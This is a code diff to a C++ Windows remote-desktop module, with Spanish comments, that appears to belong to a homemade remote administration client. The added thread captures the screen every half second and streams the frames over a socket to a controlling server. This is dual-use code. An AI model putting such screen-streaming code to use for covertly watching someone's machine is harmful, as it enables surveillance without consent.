@@ -1,5 +1,8 @@
+#include "cliente.hpp"
 #include "mod_remote_desktop.hpp"
 #include "misc.hpp"
+
+extern Cliente* cCliente;
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
     UINT  num = 0;          // number of image encoders
@@ -32,17 +35,26 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
 }
 
 mod_RemoteDesktop::mod_RemoteDesktop() {
+    this->InitGDI();
 	return;
 }
 
 mod_RemoteDesktop::~mod_RemoteDesktop() {
-	return;
+    this->StopGDI();
+    return;
 }
 
 std::vector<BYTE> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
-    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR gdiplusToken;
-    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    std::vector<BYTE> cBuffer;
+
+    if (!this->isGDIon) {
+        DebugPrint("GDI no esta inicializado, init...");
+        this->InitGDI();
+        if (!this->isGDIon) {
+            DebugPrint("[X] No se pudo iniciar...");
+            return cBuffer;
+        }
+    }
     
     HWINSTA hWindowsStation = NULL;
     HDESK hInputDesktop = NULL;
@@ -55,8 +67,7 @@ std::vector<BYTE> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
     Gdiplus::Bitmap* pScreenShot = nullptr;
     IStream* oStream;
     HRESULT hr = S_OK;
-    std::vector<BYTE> cBuffer;
-
+    
     OSVERSIONINFO os;
     int xm = SM_CXVIRTUALSCREEN;
     int ym = SM_CYVIRTUALSCREEN;
@@ -187,8 +198,7 @@ EndSec:
         pScreenShot = nullptr;
     }
 
-    Gdiplus::GdiplusShutdown(gdiplusToken);
-    GlobalFree(hGlobalMem);
+    
 
     if (hdc) {
         ReleaseDC(hDesktopWnd, hdc);
@@ -211,4 +221,56 @@ EndSec:
 
     return cBuffer;
 
+}
+
+void mod_RemoteDesktop::SpawnThread(ULONG quality) {
+    this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality);
+}
+
+void mod_RemoteDesktop::DetenerLive() {
+    DebugPrint("[RD] Apagando...");
+    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
+    this->isRunning = false;
+    lock.unlock();
+    DebugPrint("[RD] Joining thread...");
+    if (this->th_RemoteDesktop.joinable()) {
+        this->th_RemoteDesktop.join();
+    }
+    DebugPrint("[RD] Done omar :v");
+}
+
+void mod_RemoteDesktop::IniciarLive(ULONG quality) {
+    this->isRunning = true;
+
+    //Head del paquete para no tener que crear uno nuevo en el loop
+    std::string strCommand = std::to_string(EnumComandos::RD_Salida);
+    strCommand.append(1, CMD_DEL);
+    int iHeadSize = strCommand.size();
+
+    while (true) {
+        std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
+        if (!this->isRunning) {
+            break;
+        }
+        lock.unlock();
+
+        std::vector<BYTE> scrBuffer = this->getFrameBytes(quality);
+        if (scrBuffer.size() > 0) {
+            int iBufferSize = scrBuffer.size();
+            int iPaquetSize = iBufferSize + iHeadSize;
+            std::vector<BYTE> cPaquete(iPaquetSize);
+            
+            std::memcpy(cPaquete.data(), strCommand.c_str(), iHeadSize);
+            std::memcpy(cPaquete.data() + iHeadSize, scrBuffer.data(), iBufferSize);
+
+            int iSent = cCliente->cSend(cCliente->sckSocket, reinterpret_cast<const char*>(cPaquete.data()), iPaquetSize, 0, true, nullptr);
+            if (iSent == -1) {
+                break;
+            }
+            Sleep(500);
+        }else {
+            DebugPrint("Hubo un error creando el buffer. Esperando...");
+            Sleep(1000);
+        }
+    }
 }
